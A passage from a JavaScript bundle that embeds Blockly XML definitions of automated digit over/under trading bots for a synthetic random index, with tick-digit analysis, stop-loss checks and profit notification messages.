statement="false" at="true"></mutation>\n                <field name="MODE">GET</field>\n                <field name="WHERE">FROM_END</field>\n                <value name="VALUE">\n                  <block type="lastDigitList" id="Y(oaDXt1{4X~_@w5yGXZ"></block>\n                </value>\n                <value name="AT">\n                  <block type="math_number" id="-F:D7h5W/?~}LHEe~1QY">\n                    <field name="NUM">2</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="{tsj/+%b;BOeJhf_}KUq">\n                <field name="VAR" id="!}o95im:dfosc$6[v%LW" variabletype="">Tick 3</field>\n                <value name="VALUE">\n                  <block type="lists_getIndex" id="v_2l!-j|]j5/GoaR_Ha!">\n                    <mutation statement="false" at="true"></mutation>\n                    <field name="MODE">GET</field>\n                    <field name="WHERE">FROM_END</field>\n                    <value name="VALUE">\n                      <block type="lastDigitList" id="p.-xWeBWcr6sz{bRYq#e"></block>\n                    </value>\n                    <value name="AT">\n                      <block type="math_number" id="jR0:c$8zy:HhUtMBv?mj">\n                        <field name="NUM">3</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="5T_tq,F8IY==xgCmsu2{">\n                    <field name="VAR" id="S|AWDr;xbKU_pbl(^]^B" variabletype="">Tick 4</field>\n                    <value name="VALUE">\n                      <block type="lists_getIndex" id="$+c#+Q9tgwCWd9jOuo`S">\n                        <mutation statement="false" at="true"></mutation>\n                        <field name="MODE">GET</field>\n                        <field name="WHERE">FROM_END</field>\n                        <value name="VALUE">\n                          <block type="lastDigitList" id="y(gaU5DXB@XB61,mO7Nq"></block>\n                        </value>\n                        <value name="AT">\n                          <block type="math_number" id="1ZkZzF~-:CPJUe:BW;3i">\n                            <field name="NUM">4</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="text_join" id="^^Fc}hxw52Hdr5Zxtpes">\n                        <field name="VARIABLE" id="ypyVjlM$)k$CdN.ur$|q" variabletype="">text</field>\n                        <statement name="STACK">\n                          <block type="text_statement" id="_0wvj[T)pGHXGK[:K7P%">\n                            <value name="TEXT">\n                              <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="K=G3*{5NZ:Ak6(fvX$]p">\n                                <field name="TEXT"/>\n                              </shadow>\n                              <block type="text" id="+W@ZQNXSji8U6fN%t5u_">\n                                <field name="TEXT">Digit Scanner Running...</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="text_statement" id="-eQQKx0dDLbbc2eV40@N">\n                                <value name="TEXT">\n                                  <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="w/K]Pi-M@g9e;|SGObvu">\n                                    <field name="TEXT"/>\n                                  </shadow>\n                                  <block type="variables_get" id="AS0/e!K#hw}p,ZJ*o[)f">\n                                    <field name="VAR" id="o!-=j_eJZCfW(+iV7;MS" variabletype="">Tick 1</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </next>\n                          </block>\n                        </statement>\n                        <next>\n                          <block type="notify" id="oE+TOEWR%,$gFY|nCa9`">\n                            <field name="NOTIFICATION_TYPE">success</field>\n                            <field name="NOTIFICATION_SOUND">silent</field>\n                            <value name="MESSAGE">\n                              <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="-[{UC:aEhf!P7ANey8vl">\n                                <field name="TEXT">abc</field>\n                              </shadow>\n                              <block type="variables_get" id="*L0)xUL`(cKyreA/Lt/6">\n                                <field name="VAR" id="ypyVjlM$)k$CdN.ur$|q" variabletype="">text</field>\n                              </block>\n                            </value>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_defnoreturn" id="e5j@,T)M^jDnw3e$%k]]" collapsed="true" x="0" y="2108">\n    <field name="NAME">start</field>\n    <comment id="~!9RGhs3YLTu4zcsk:#c" pinned="false" h="80" w="160" x="189" y="2116" minimized="false">Describe this function...</comment>\n    <statement name="STACK">\n      <block type="variables_set" id="rNK]Z1/gtF1n;b%XlKpn" collapsed="true">\n        <field name="VAR" id="nSn|iFbXeauB$bherh9l" variabletype="">stake1</field>\n        <value name="VALUE">\n          <block type="variables_get" id="@%b`aQQdYUXvQCS(QA+%">\n            <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="@ztNYUVkzAW=L5J;xsk7" collapsed="true">\n            <field name="VAR" id="tcz@s#J5]`0C_*$yA%N1" variabletype="">Stake2</field>\n            <value name="VALUE">\n              <block type="variables_get" id="huBfB2Iz=[ugim;Ap}~x">\n                <field name="VAR" id="~ZEk9Zr7t[g;-`afIGOO" variabletype="">Initial Stake</field>\n              </block>\n            </value>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_defnoreturn" id=":ejvXL{GRp2roLjJ2OHO" x="0" y="2204">\n    <field name="NAME">werttyg</field>\n    <comment id="XLC3x?[.%ZRchQUsYpI|" pinned="false" h="80" w="160" x="432" y="2212" minimized="false">Describe this function...</comment>\n    <statement name="STACK">\n      <block type="procedures_callnoreturn" id="`h|uWR.arVm*@UQI,!-L">\n        <mutation name="start"></mutation>\n        <data>e5j@,T)M^jDnw3e$%k]]</data>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_defnoreturn" id="t$~c:}uQBf!?qC%/zuAI" collapsed="true" x="0" y="2388">\n    <field name="NAME">Trade</field>\n    <comment id="T]Y{.c5WiLNR`?(P!u_/" pinned="false" h="80" w="160" x="196" y="2396" minimized="false">Describe this function...</comment>\n    <statement name="STACK">\n      <block type="procedures_callnoreturn" id="QKHOiRtsUTUOY[!:fZZM">\n        <mutation name="werttyg"></mutation>\n        <data>:ejvXL{GRp2roLjJ2OHO</data>\n      </block>\n    </statement>\n  </block>\n</xml>'
            },
            49621: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="http://www.w3.org/1999/xhtml" is_dbot="true" collection="false">\n  <variables>\n    <variable type="" id="7Q4y$nr_sr!x2NkOu%)2" islocal="false" iscloud="false">Stake</variable>\n    <variable type="" id="!(f!MzWu/SJJ;NaP]=?!" islocal="false" iscloud="false">Tick 1</variable>\n    <variable type="" id="Mbkib,V~cE~Q4]93TSDB" islocal="false" iscloud="false">stake1</variable>\n    <variable type="" id="Ts#U?;aaUJw@/c`sQ~,F" islocal="false" iscloud="false">Session Profit</variable>\n    <variable type="" id=":o#E4Mv[vmJES2fN=qo0" islocal="false" iscloud="false">Prediction</variable>\n    <variable type="" id="]_MS:$MrQakFy~dy[v}a" islocal="false" iscloud="false">text</variable>\n    <variable type="" id="/.fQ=@I~l,Dz0|e2a)(n" islocal="false" iscloud="false">Tick 2</variable>\n    <variable type="" id="SA7[_Xse_9Dl,O2+NgEb" islocal="false" iscloud="false">Your STOP LOSS</variable>\n    <variable type="" id="HyNhO~!rk1(6_u;tk|_i" islocal="false" iscloud="false">Trade Direction</variable>\n    <variable type="" id="1sRF8Ow=LBCxCjDWi$Th" islocal="false" iscloud="false">Tick 3</variable>\n    <variable type="" id="K`h}~iKgn?Z)RHYaKFfT" islocal="false" iscloud="false">Over Prediction</variable>\n    <variable type="" id="-,,SFHLGG.vq!}k=`g7Z" islocal="false" iscloud="false">Tick 4</variable>\n    <variable type="" id="@GRV-f=US~_%4pd.i}2Q" islocal="false" iscloud="false">Under Prediction</variable>\n    <variable type="" id="m,z.@5Yu$?_Bd{8Q2W!G" islocal="false" iscloud="false">Tick 5</variable>\n    <variable type="" id="ukT(SY)bu+~AVg_WMSD4" islocal="false" iscloud="false">Tick 6</variable>\n    <variable type="" id="d-Q=D:)jfS|7|k=#h|-/" islocal="false" iscloud="false">text2</variable>\n  </variables>\n  <block type="trade_definition" id="Trl.sJ3}+U,c~e-zFUy^" deletable="false" x="0" y="60">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" id="~=oeIoZ%WS/q]1NWBf;P" deletable="false" movable="false">\n        <field name="MARKET_LIST">synthetic_index</field>\n        <field name="SUBMARKET_LIST">random_index</field>\n        <field name="SYMBOL_LIST">R_100</field>\n        <next>\n          <block type="trade_definition_tradetype" id="uT06=pes~zdz4ppk!7al" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST">digits</field>\n            <field name="TRADETYPE_LIST">overunder</field>\n            <next>\n              <block type="trade_definition_contracttype" id="+:36ts]!!))@0zb2Cw?}" deletable="false" movable="false">\n                <field name="TYPE_LIST">both</field>\n                <next>\n                  <block type="trade_definition_candleinterval" id="`-._(9_zhwbfP0b9+,d}" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" id="`/R47tY(;Ez%$vb[n+%*" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">FALSE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" id="wlGGC5P.p*4$V[]BL[iS" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="INITIALIZATION">\n      <block type="variables_set" id="7sPy:Sl^ri)cRWQ=WuLm">\n        <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n        <value name="VALUE">\n          <block type="math_number" id="qT87lDuK9}qjV+3;/[u6">\n            <field name="NUM">1</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="([}7^3RUy=3jxOMc^PNJ">\n            <field name="VAR" id="Ts#U?;aaUJw@/c`sQ~,F" variabletype="">Session Profit</field>\n            <value name="VALUE">\n              <block type="math_number" id="3N|+2I?dnv(B)ixf$S$l">\n                <field name="NUM">3</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="yG/+?^oug2eZe|G..*EU">\n                <field name="VAR" id="SA7[_Xse_9Dl,O2+NgEb" variabletype="">Your STOP LOSS</field>\n                <value name="VALUE">\n                  <block type="math_number" id="JKmL:#rEJo0!(x_Fx6a~">\n                    <field name="NUM">100</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="|aPCht%cR1;/{xBLPS3`">\n                    <field name="VAR" id="K`h}~iKgn?Z)RHYaKFfT" variabletype="">Over Prediction</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="q?286.t{mx:LnX9J5j[,">\n                        <field name="NUM">7</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="~(`[dsZp^m9FuqDydNz3">\n                        <field name="VAR" id="@GRV-f=US~_%4pd.i}2Q" variabletype="">Under Prediction</field>\n                        <value name="VALUE">\n                          <block type="math_number" id=":kdVhp0U=xE2ALN65?fz">\n                            <field name="NUM">7</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="a[z|?7iqhrS/.m(OR8L(" collapsed="true">\n                            <field name="VAR" id=":o#E4Mv[vmJES2fN=qo0" variabletype="">Prediction</field>\n                            <value name="VALUE">\n                              <block type="variables_get" id="G:bSQLMo@(lMc^5Z(#QV">\n                                <field name="VAR" id="@GRV-f=US~_%4pd.i}2Q" variabletype="">Under Prediction</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="variables_set" id="6Q](V?T%PKX8Rij[$j!S" collapsed="true">\n                                <field name="VAR" id="HyNhO~!rk1(6_u;tk|_i" variabletype="">Trade Direction</field>\n                                <value name="VALUE">\n                                  <block type="math_number" id="3oMHex_SyQHn=!2(5ozL">\n                                    <field name="NUM">1</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="procedures_callnoreturn" id="N.L/h6dlZEi_LcRyy]3I">\n                                    <mutation name="Trade"></mutation>\n                                    <data>l0jmRU]7@[)IX}1bRfM{</data>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="trade_definition_tradeoptions" id="{Dkfk~3kkr.wc8@{)~m0">\n        <mutation has_first_barrier="false" has_second_barrier="false" has_prediction="true"></mutation>\n        <field name="DURATIONTYPE_LIST">t</field>\n        <value name="DURATION">\n          <shadow type="math_number" id="%PF8u9|zX9*I{Sj|1VT@">\n            <field name="NUM">1</field>\n          </shadow>\n        </value>\n        <value name="AMOUNT">\n          <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="TJ!MrnCmrS$Bx?A%Huu8">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="[=[~D]2jYL~/tc4OS]8/">\n            <field name="VAR" id="Mbkib,V~cE~Q4]93TSDB" variabletype="">stake1</field>\n          </block>\n        </value>\n        <value name="PREDICTION">\n          <shadow type="math_number_positive" id="`4tfre9v{+fZcAeGo5R[">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="DR,CP(`,^*E0=DJ%4[ZZ">\n            <field name="VAR" id=":o#E4Mv[vmJES2fN=qo0" variabletype="">Prediction</field>\n          </block>\n        </value>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" id="Q!WjmqV!JmoPK$1p=,Z`" x="965" y="60">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="controls_if" id=")DN{cw.=-)6[,2s01][y" collapsed="true">\n        <mutation elseif="1" else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="_A{.]PjMZUh!;SaEL(PQ">\n            <field name="OP">GT</field>\n            <value name="A">\n              <block type="total_profit" id="kF8CU|)Q8);OEBV23B35"></block>\n            </value>\n            <value name="B">\n              <block type="variables_get" id="H6A]tIXPMPJiME$*UNm5">\n                <field name="VAR" id="Ts#U?;aaUJw@/c`sQ~,F" variabletype="">Session Profit</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="text_join" id="_k:V[v`h|_I*K4:#)ubt">\n            <field name="VARIABLE" id="]_MS:$MrQakFy~dy[v}a" variabletype="">text</field>\n            <statement name="STACK">\n              <block type="text_statement" id="J#s9K;Gz8[uD;7fOS9Yx">\n                <value name="TEXT">\n                  <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="y1`#U#x]%8%ipVU;wSg6">\n                    <field name="TEXT"/>\n                  </shadow>\n                  <block type="text" id="9*Kg~zr+^%wl1f/j$$*}">\n                    <field name="TEXT">.......</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="text_statement" id="1g~?n9%iP08%^|a}^)D-">\n                    <value name="TEXT">\n                      <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="8x84,??pD;a}S^9Xe,fn">\n                        <field name="TEXT"/>\n                      </shadow>\n                      <block type="text" id="#GiuOl|!IS#.dQ,z^u{[">\n                        <field name="TEXT">&lt;&lt; CONGRATULATIONS. &gt;&gt; You have printed... $ </field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="text_statement" id="Wzeq`?|_(.Zo(MF%PVUa">\n                        <value name="TEXT">\n                          <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="}N!T)apd~+!_c/N8Si}1">\n                            <field name="TEXT"/>\n                          </shadow>\n                          <block type="total_profit" id="{kIC:;hH!GMLK%hKOr-T"></block>\n                        </value>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="text_print" id="N(~vr~Hw#=;E6-FksizO">\n                <value name="TEXT">\n                  <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="Bp6$(VRo#UxnC*1F~=(Y">\n                    <field name="TEXT">abc</field>\n                  </shadow>\n                  <block type="variables_get" id="#Nh0(1m^U=cv7LhiE+?x">\n                    <field name="VAR" id="]_MS:$MrQakFy~dy[v}a" variabletype="">text</field>\n                  </block>\n                </value>\n              </block>\n            </next>\n          </block>\n        </statement>\n        <value name="IF1">\n          <block type="logic_compare" id="(3lxZO)+TFHkO/ZE-H{_">\n            <field name="OP">LTE</field>\n            <value name="A">\n              <block type="total_profit" id="92Qbg1t!lVn)NW*Q=FuP"></block>\n            </value>\n            <value name="B">\n              <block type="math_single" id="sf,dgQghD-NYMjkPa9V}">\n                <field name="OP">NEG</field>\n                <value name="NUM">\n                  <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="g?}T~{P65EWn}05ZD[m2">\n                    <field name="NUM">9</field>\n                  </shadow>\n                  <block type="variables_get" id="m3%1*N$kEWU-#m@@=g6]">\n                    <field name="VAR" id="SA7[_Xse_9Dl,O2+NgEb" variabletype="">Your STOP LOSS</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO1">\n          <block type="text_print" id="Z~N+o*JsESvm?N9h$P+g">\n            <value name="TEXT">\n              <shadow type="text" id="Yl^bIS+46ZexaS?Kr*#B">\n                <field name="TEXT">OOPS! You have Hit your Stop Loss level. Try again later.</field>\n              </shadow>\n            </value>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="controls_if" id="y|Maz[iF+,XXr*SS;dMc">\n            <mutation else="1"></mutation>\n            <value name="IF0">\n              <block type="contract_check_result" id="XV2Q0E0iQiX9MAc}Ef8A">\n                <field name="CHECK_RESULT">win</field>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="variables_set" id="MrPv1PE+y[*~{SPeHB#v">\n                <field name="VAR" id="HyNhO~!rk1(6_u;tk|_i" variabletype="">Trade Direction</field>\n                <value name="VALUE">\n                  <block type="math_number" id="tI[r?GR?Wxfy^NA|7i}t">\n                    <field name="NUM">1</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="#t])Wko5d{6r,!u8rN`2">\n                    <field name="VAR" id=":o#E4Mv[vmJES2fN=qo0" variabletype="">Prediction</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="z!x0@[~P}s`m{WK{O*N2">\n                        <field name="VAR" id="@GRV-f=US~_%4pd.i}2Q" variabletype="">Under Prediction</field>\n                      </block>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="variables_set" id="N[OgR#+rozJPhhP1(mh`">\n                <field name="VAR" id="HyNhO~!rk1(6_u;tk|_i" variabletype="">Trade Direction</field>\n                <value name="VALUE">\n                  <block type="math_number" id="+EOo1sB@OV5LoQ^i*~$E">\n                    <field name="NUM">0</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="KVy-mg|N+4p=z,p%L@*Q">\n                    <field name="VAR" id=":o#E4Mv[vmJES2fN=qo0" variabletype="">Prediction</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="+(V.|a~SZS3E%#i~/,=B">\n                        <field name="VAR" id="K`h}~iKgn?Z)RHYaKFfT" variabletype="">Over Prediction</field>\n                      </block>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="trade_again" id="dX9#uq8!`~,W]rcu15[e"></block>\n            </next>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="before_purchase" id="Gs}:IU2/fgSK=gw}wEzj" deletable="false" x="0" y="996">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="controls_if" id="{JUMUeN0qE_yhh6o;bv`">\n        <mutation else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="9Krsro|CE%1!_``.zV12" collapsed="true">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="variables_get" id=")o9})(W{{X9?{Qm}|_(:">\n                <field name="VAR" id="HyNhO~!rk1(6_u;tk|_i" variabletype="">Trade Direction</field>\n              </block>\n            </value>\n            <value name="B">\n              <block type="math_number" id="w~V@Nr1{v3e)AO4}T+VU">\n                <field name="NUM">1</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="controls_if" id="D7:etLcUg1.qaq)72!%P">\n            <value name="IF0">\n              <block type="logic_compare" id="nVb[GT~Ay:w=8R*iC|Or">\n                <field name="OP">GTE</field>\n                <value name="A">\n                  <block type="variables_get" id="J}Fwcu2$Q`cB?,+7Z?Z6">\n                    <field name="VAR" id="!(f!MzWu/SJJ;NaP]=?!" variabletype="">Tick 1</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="L]oVFaJFiXsMm/G7Os*L">\n                    <field name="NUM">5</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="apollo_purchase" id="4oUF0V`vAb?3~p;(}guu">\n                <field name="PURCHASE_LIST">DIGITUNDER</field>\n              </block>\n            </statement>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="controls_if" id="JIsK?K0cc^OR(ioRC7%=" collapsed="true">\n            <value name="IF0">\n              <block type="logic_compare" id="0*B]f,={;e,|0(R9$+n/">\n                <field name="OP">LTE</field>\n                <value name="A">\n                  <block type="variables_get" id="LkKgv)9$x80Ufs]Su1Qu">\n                    <field name="VAR" id="!(f!MzWu/SJJ;NaP]=?!" variabletype="">Tick 1</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="yX0=TxZkJtB/+6NF#vAM">\n                    <field name="NUM">7</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="controls_if" id="yd0]lt8m3Z^wW-(#PeVr">\n                <value name="IF0">\n                  <block type="logic_compare" id="6qP|C.;b#}63NQW.QCk|">\n                    <field name="OP">LTE</field>\n                    <value name="A">\n                      <block type="variables_get" id="tCz4O`ep.m4}4C)TKOPh">\n                        <field name="VAR" id="/.fQ=@I~l,Dz0|e2a)(n" variabletype="">Tick 2</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <block type="math_number" id="Tkp8p@IT(KX_{P9m4$GP">\n                        <field name="NUM">7</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO0">\n                  <block type="controls_if" id="vT9PE)Q2~nbCSXyy,J`V">\n                    <value name="IF0">\n                      <block type="logic_compare" id="t^j|2u?718*#iFAZoW_0">\n                        <field name="OP">LTE</field>\n                        <value name="A">\n                          <block type="variables_get" id=")9gIt`jbuJsKjHpm0INP">\n                            <field name="VAR" id="1sRF8Ow=LBCxCjDWi$Th" variabletype="">Tick 3</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <block type="math_number" id="k{F_g1:M:=%x1-FlgnI*">\n                            <field name="NUM">7</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                    <statement name="DO0">\n                      <block type="controls_if" id="COj[JeK=7Ww^$rZx,`p@">\n                        <value name="IF0">\n                          <block type="logic_compare" id="=lS4P%hj[*$]*/b*t}jL">\n                            <field name="OP">LTE</field>\n                            <value name="A">\n                              <block type="variables_get" id="PS)H-aYw8wM]J/4V(X-r">\n                                <field name="VAR" id="-,,SFHLGG.vq!}k=`g7Z" variabletype="">Tick 4</field>\n                              </block>\n                            </value>\n                            <value name="B">\n                              <block type="math_number" id="Z{E0C1[6{6lujC-~9Qf)">\n                                <field name="NUM">7</field>\n                              </block>\n                            </value>\n                          </block>\n                        </value>\n                        <statement name="DO0">\n                          <block type="controls_if" id="xqJR.D^2bO.o2[3hZ4q=">\n                            <value name="IF0">\n                              <block type="logic_compare" id="F2c-7Kfh;m3WzsgI!*5t">\n                                <field name="OP">LTE</field>\n                                <value name="A">\n                                  <block type="variables_get" id="-D0ZbI7ACvk*_[8f:SF7">\n                                    <field name="VAR" id="m,z.@5Yu$?_Bd{8Q2W!G" variabletype="">Tick 5</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <block type="math_number" id="G*Xw1A`JF(F%3dk92E3B">\n                                    <field name="NUM">7</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <statement name="DO0">\n                              <block type="apollo_purchase" id="ws]_ha)nio4mZUG4NH[d">\n                                <field name="PURCHASE_LIST">DIGITOVER</field>\n                              </block>\n                            </statement>\n                          </block>\n                        </statement>\n                      </block>\n                    </statement>\n                  </block>\n                </statement>\n              </block>\n            </statement>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_defnoreturn" id="l0jmRU]7@[)IX}1bRfM{" collapsed="true" x="0" y="1460">\n    <field name="NAME">Trade</field>\n    <comment id="c?[%!Mm@A*G9khy7kIex" pinned="false" h="80" w="160" x="196" y="1468" minimized="false">Describe this function...</comment>\n    <statement name="STACK">\n      <block type="procedures_callnoreturn" id="Hi%1WYesfC0rF7^JOO(g">\n        <mutation name="werttyg"></mutation>\n        <data>l#e`yhRzew2ph)2f%Sut</data>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_defnoreturn" id="l#e`yhRzew2ph)2f%Sut" collapsed="true" x="0" y="1556">\n    <field name="NAME">werttyg</field>\n    <comment id="]Nrmp4p*$1I^!Pb7knM]" pinned="false" h="80" w="160" x="212" y="1564" minimized="false">Describe this function...</comment>\n    <statement name="STACK">\n      <block type="procedures_callnoreturn" id="~G4FTPRuD(ruwp~E19.v">\n        <mutation name="Tyre"></mutation>\n        <data>s;(z*=QRKMh5SJ%^p)^4</data>\n      </block>\n    </statement>\n  </block>\n  <block type="tick_analysis" id="5*Ez@IpGDv={02K!#6{0" x="0" y="1740">\n    <statement name="TICKANALYSIS_STACK">\n      <block type="variables_set" id="2Vy8_Bq7ic,b*6TRC,~E">\n        <field name="VAR" id="!(f!MzWu/SJJ;NaP]=?!" variabletype="">Tick 1</field>\n        <value name="VALUE">\n          <block type="lists_getIndex" id="V-_v/ltdfZ0_gw[7sZ%D">\n            <mutation statement="false" at="true"></mutation>\n            <field name="MODE">GET</field>\n            <field name="WHERE">FROM_END</field>\n            <value name="VALUE">\n              <block type="lastDigitList" id="!axiWwLg+Y_H[p4o.%7{"></block>\n            </value>\n            <value name="AT">\n              <block type="math_number" id="EVYc}ISMX{$(fd;kO]HZ">\n                <field name="NUM">1</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="|UdDYk4%Ech@+|t#DL/?">\n            <field name="VAR" id="/.fQ=@I~l,Dz0|e2a)(n" variabletype="">Tick 2</field>\n            <value name="VALUE">\n              <block type="lists_getIndex" id="AM;`M0b:,/EJt1XskQIf">\n                <mutation statement="false" at="true"></mutation>\n                <field name="MODE">GET</field>\n                <field name="WHERE">FROM_END</field>\n                <value name="VALUE">\n                  <block type="lastDigitList" id="|{#7{s!ym/=GN8Yt]B/6"></block>\n                </value>\n                <value name="AT">\n                  <block type="math_number" id="m(d]|a4;SOs=ZXA@,4={">\n                    <field name="NUM">2</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="H1NwvG;.mvO]:_d=yV@+">\n                <field name="VAR" id="1sRF8Ow=LBCxCjDWi$Th" variabletype="">Tick 3</field>\n                <value name="VALUE">\n                  <block type="lists_getIndex" id="iCxRzDV60hVbJx)IZA9o">\n                    <mutation statement="false" at="true"></mutation>\n                    <field name="MODE">GET</field>\n                    <field name="WHERE">FROM_END</field>\n                    <value name="VALUE">\n                      <block type="lastDigitList" id="HhGz/hkz{Sc/0k@0b+ny"></block>\n                    </value>\n                    <value name="AT">\n                      <block type="math_number" id="mwNTJ[C%7j/g#:(3[sD5">\n                        <field name="NUM">3</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id=".Ha[I.6o08tql5$+|?)i">\n                    <field name="VAR" id="-,,SFHLGG.vq!}k=`g7Z" variabletype="">Tick 4</field>\n                    <value name="VALUE">\n                      <block type="lists_getIndex" id="69;_}6s,T.@Z]`Tj~Kn8">\n                        <mutation statement="false" at="true"></mutation>\n                        <field name="MODE">GET</field>\n                        <field name="WHERE">FROM_END</field>\n                        <value name="VALUE">\n                          <block type="lastDigitList" id="xc^|HTNq[0uN)k0T@g2r"></block>\n                        </value>\n                        <value name="AT">\n                          <block type="math_number" id="(7jcNG?6n;8GnTaU+P!o">\n                            <field name="NUM">4</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="t4!8|@(K:#s)MGs)`rXf">\n                        <field name="VAR" id="m,z.@5Yu$?_Bd{8Q2W!G" variabletype="">Tick 5</field>\n                        <value name="VALUE">\n                          <block type="lists_getIndex" id="yZ`_Z5mh0|w2Az6?wrJb">\n                            <mutation statement="false" at="true"></mutation>\n                            <field name="MODE">GET</field>\n                            <field name="WHERE">FROM_END</field>\n                            <value name="VALUE">\n                              <block type="lastDigitList" id="tE|)Q[n9KtbiVfiTu}Z."></block>\n                            </value>\n                            <value name="AT">\n                              <block type="math_number" id="ctz!Wqc5YSsz!YJPSt~Z">\n                                <field name="NUM">5</field>\n                              </block>\n                            </value>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="c=IfxIxtw#LCVEv%.=t=">\n                            <field name="VAR" id="ukT(SY)bu+~AVg_WMSD4" variabletype="">Tick 6</field>\n                            <value name="VALUE">\n                              <block type="lists_getIndex" id="FL.gH3s#*GUa@[+yj8d~">\n                                <mutation statement="false" at="true"></mutation>\n                                <field name="MODE">GET</field>\n                                <field name="WHERE">FROM_END</field>\n                                <value name="VALUE">\n                                  <block type="lastDigitList" id="DO|i|*DyB1ScFSgRzVG]"></block>\n                                </value>\n                                <value name="AT">\n                                  <block type="math_number" id="V_l)c*BFe^5chN5@Nw?X">\n                                    <field name="NUM">6</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="text_join" id="St`j=B-7}]UO5(qk+`$o">\n                                <field name="VARIABLE" id="]_MS:$MrQakFy~dy[v}a" variabletype="">text</field>\n                                <statement name="STACK">\n                                  